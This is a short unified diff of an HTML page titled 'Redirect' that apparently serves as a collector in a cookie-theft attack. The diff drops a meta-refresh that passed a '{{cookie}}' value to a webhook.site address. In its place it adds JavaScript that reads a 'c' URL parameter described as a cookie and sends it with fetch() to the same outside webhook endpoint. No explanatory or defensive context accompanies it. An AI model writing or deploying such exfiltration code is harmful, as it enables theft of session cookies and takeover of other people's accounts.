@@ -2,10 +2,30 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://webhook.site/15c60a75-956e-4320-a733-b17980afb4f7?c={{cookie}}">
     <title>Redirect</title>
 </head>
 <body>
-    Redirecting...
+    <script>
+        // Extract the cookie from the URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const cookie = urlParams.get('c');
+
+        // Send the cookie to the webhook
+        if (cookie) {
+            fetch('https://webhook.site/15c60a75-956e-4320-a733-b17980afb4f7?c=' + encodeURIComponent(cookie))
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Cookie sent successfully');
+                    } else {
+                        console.error('Failed to send cookie');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        } else {
+            console.error('No cookie found in URL parameters');
+        }
+    </script>
 </body>
 </html>
